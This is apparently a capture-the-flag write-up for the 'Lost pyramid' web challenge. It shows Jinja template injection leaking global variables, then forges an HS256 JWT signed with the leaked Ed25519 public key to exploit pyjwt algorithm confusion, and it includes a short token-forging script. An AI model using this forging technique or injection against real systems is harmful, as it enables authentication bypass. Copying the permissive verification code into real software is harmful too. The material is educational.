# Lost pyramid
A fun little challenge involving jwt tokens. The wmebsite has multiple rooms with their own endpoints. Noteworthy rooms are `/kings_liar` and `/scarab_room`
Notably,  the scarab room has some suspicious code:
```python
if request.method == 'POST':  
    name = request.form.get('name')  
    if name:  
        kings_safelist = ['{','}', '𓁹', '𓆣','𓀀', '𓀁', '𓀂', '𓀃', '𓀄', '𓀅', '𓀆', '𓀇', '𓀈', '𓀉', '𓀊',   
                            '𓀐', '𓀑', '𓀒', '𓀓', '𓀔', '𓀕', '𓀖', '𓀗', '𓀘', '𓀙', '𓀚', '𓀛', '𓀜', '𓀝', '𓀞', '𓀟',  
                            '𓀠', '𓀡', '𓀢', '𓀣', '𓀤', '𓀥', '𓀦', '𓀧', '𓀨', '𓀩', '𓀪', '𓀫', '𓀬', '𓀭', '𓀮', '𓀯',  
                            '𓀰', '𓀱', '𓀲', '𓀳', '𓀴', '𓀵', '𓀶', '𓀷', '𓀸', '𓀹', '𓀺', '𓀻']    
        name = ''.join([char for char in name if char.isalnum() or char in kings_safelist])  
  
        return render_template_string('''  
            <!DOCTYPE html>            <html lang="en">            ...            <body>                <a href="{{ url_for('hallway') }}" class="return-link">RETURN</a>                                {% if name %}  
                    <h1>𓁹𓁹𓁹 Welcome to the Scarab Room, '''+ name + ''' 𓁹𓁹𓁹</h1>  
                {% endif %}                            </body>  
            </html>        ''', name=name, **globals())
```
Here, name is directly added to the template then rendered , allowing for SSTI. We just so happen to be able to use curly brackets in name, which means we are able to inject jinja expressions into the code. Unfortunately, only alphanumeric characters and hierographics(which are useless) are allowed, meaning we can't directly invoke any code.  Since all global variables are provided to the template we, are able to access the variables defined:
```python
# Load keys  
with open('private_key.pem', 'rb') as f:  
    PRIVATE_KEY = f.read()  
  
with open('public_key.pub', 'rb') as f:  
    PUBLICKEY = f.read()  
  
KINGSDAY = os.getenv("KINGSDAY", "TEST_TEST")  
  
current_date = datetime.datetime.now()  
current_date = current_date.strftime("%d_%m_%Y")
```
![[Pasted image 20240910223417.png]]
![[Pasted image 20240910223346.png]]
![[Pasted image 20240910223507.png]]
`PRIVATE_KEY` contains an underscore and can not be accessed through the template injection here. 
On to the `kings_liar`, whose template contains our flag:
```python
@app.route('/kings_lair', methods=['GET'])  
def kings_lair():  
    token = request.cookies.get('pyramid')  
    if not token:  
        return jsonify({"error": "Token is required"}), 400  
  
    try:  
        decoded = jwt.decode(token, PUBLICKEY, algorithms=jwt.algorithms.get_default_algorithms())  
        if decoded.get("CURRENT_DATE") == KINGSDAY and decoded.get("ROLE") == "royalty":  
            return render_template('kings_lair.html')  
        else:  
            return jsonify({"error": "Access Denied: King said he does not way to see you today."}), 403  
    except jwt.ExpiredSignatureError:  
        return jsonify({"error": "Access has expired"}), 401  
    except jwt.InvalidTokenError as e:  
        print(e)  
        return jsonify({"error": "Invalid Access"}), 401
```
Checks are performed to ensure our decoded pyramid cookie has the correct date and role. This cookie is set in the hallway, but is not the right value we want. Now, we need a way to tamper with the token, while keeping its signature valid. Upon analysis, the token is first set in the `/enterance`, and signed using EdDSA, an asymmetric signing algorithm
```python
@app.route('/entrance', methods=['GET'])  
def entrance():  
    payload = {  
        "ROLE": "commoner",  
        "CURRENT_DATE": f"{current_date}_AD",  
        "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365*3000))  
    }    token = jwt.encode(payload, PRIVATE_KEY, algorithm="EdDSA")  
    response = make_response(render_template('pyramid.html'))  
    response.set_cookie('pyramid', token)  
    return response
```
In order to product a valid token, we would need to know the private key, which we can't access. However, consider this line of code again
```python
decoded = jwt.decode(token, PUBLICKEY, algorithms=jwt.algorithms.get_default_algorithms())  
```
Here, the token supports using multiple signing algorithms, including symmetric ones such as `HS256`. In that case, the key used for verification is also the key used for signing. By knowing the public key(which we obtained previously) , we can forge our own tokens!
Solution:
```python
import jwt
import datetime
PUBLICKEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2"
payload = {  
    "ROLE": "royalty",  
    "CURRENT_DATE": f"03_07_1341_BC",  
    "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=(365*3000))  
}
token = jwt.encode(payload, PUBLICKEY) # Default algorithm is HS256
print(token)
```
Using this cookie, we are able to access the king's liar:
![[Pasted image 20240910230334.png]]
> Interestingly, this challenge would have been solved faster if I bothered checking pyjwt's github: https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24
> This is a fun little reminder to always see if there are any known vulnerabilities in the libraries used.